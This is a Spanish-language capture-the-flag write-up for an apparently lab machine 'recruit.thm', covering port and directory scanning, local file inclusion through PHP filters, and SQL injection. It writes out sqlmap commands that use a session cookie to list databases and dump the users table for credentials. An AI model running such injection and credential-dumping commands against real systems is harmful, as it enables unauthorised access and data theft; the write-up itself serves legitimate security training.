---
layout: apunte
title: "2. Getting the Flags"
---

<h2>Reconocimiento Inicial</h2>
Comenzamos escaneando los puertos abiertos.

!**Pasted image 20260922095551.png**

Ahora vamos a escanear dichos puertos más en profundidad.

!**Pasted image 20260922095612.png**

Vamos a ver qué directorios tiene.

```text
recruit.thm
    ├── assets [200 636B]
    ├── mail [200 453B]
    │   └── mail.log [200 2KB]
    ├── phpmyadmin [200 3KB]
    │   ├── doc
    │   │   └── html
    │   │       ├── config.html [200 44KB]
    │   │       ├── faq.html [200 48KB]
    │   │       ├── index.html [200 3KB]
    │   │       ├── search.html [200 1KB]
    │   │       ├── settings.html [200 2KB]
    │   │       └── user.html [200 2KB]
    │   ├── js
    │   │   ├── common.js [200 5KB]
    │   │   ├── config.js [200 7KB]
    │   │   ├── export.js [200 6KB]
    │   │   └── sql.js [200 9KB]
    │   ├── favicon.ico [200 22KB]
    │   └── index.php [200 3KB]
    ├── api.php [200 1019B]
    ├── file.php [200 20B]
    ├── footer.php [200 210B]
    ├── header.php [200 256B]
    └── sitemap.xml [200 471B]
```

Hay algunos archivos que parecen interesantes, como `api.php`. Vamos a ver cómo es la página web.

!**Pasted image 20260922101138.png**

-------------------------
<h2>Profundización</h2>
Vamos a ver qué hay por la web e investigar sobre los archivos encontrados.

!**Pasted image 20260922101241.png**

Esto parece muy interesante. Si el backend evalúa código PHP, podemos servir una reverse shell desde nuestra máquina y conseguir una reverse shell. 

---------------------------
<h2>Explotación</h2>
<h3>LFI</h3>
Vamos a intentarlo.

!**Pasted image 20260922101754.png**

Como dice que sólo se permiten archivos locales vamos a probar a leer `config.php`, ya que sabemos que es una aplicación PHP.

!**Pasted image 20260922102016.png**

Se ve que no existe. Vamos a intentar LFI mediante filtros PHP:

!**Pasted image 20260922102122.png**

Parece que esto sí que ha funcionado. Vamos a intentar iniciar sesión.

!**Pasted image 20260922102222.png**

Esto obtenemos al iniciar sesión con `hr`.

--------------------------------
<h2>Escalada de Privilegios</h2>
<h3>SQL Injection</h3>
En la página de dashboard podemos ver un parámetro de búsqueda de empleados, por lo que vamos a probar lo que probaríamos al ver cualquier caja de búsqueda que aparentemente mira en una base de datos, emplear una SQLi.

!**Pasted image 20260922133714.png**

La prueba resulta exitosa. Hay indicios de SQLi. Vamos a intentar obtener información. Vamos a intentar usar sqlmap para ello. Para poder usarlo, como la sesión se maneja con una cookie, necesitamos incluirla o no funcionará por fallo al acceder a `/dashboard.php`.

```bash
sqlmap -u "http://recruit.thm/dashboard.php?search=1" --cookie="PHPSESSID=[COOKIE]; security=low" --dbs
```

!**Pasted image 20260922134320.png**

Vamos a intentar extraer información de la base `recruit_db`:

```bash
sqlmap -u "http://recruit.thm/dashboard.php?search=1" --cookie="PHPSESSID=[COOKIE]; security=low" -D recruit_db --tables
```

!**Pasted image 20260922134524.png**

Ahora vamos a listar los datos de los usuarios.

```bash
sqlmap -u "http://recruit.thm/dashboard.php?search=1" --cookie="PHPSESSID=[COOKIE]; security=low" -D recruit_db -T users --dump
```

!**Pasted image 20260922134650.png**

Con estas credenciales vamos a intentar acceder.

!**Pasted image 20260922134807.png**

Y con esto conseguimos la flag de admin.

>[!SUCCESS] Ambas flags obtenidas!

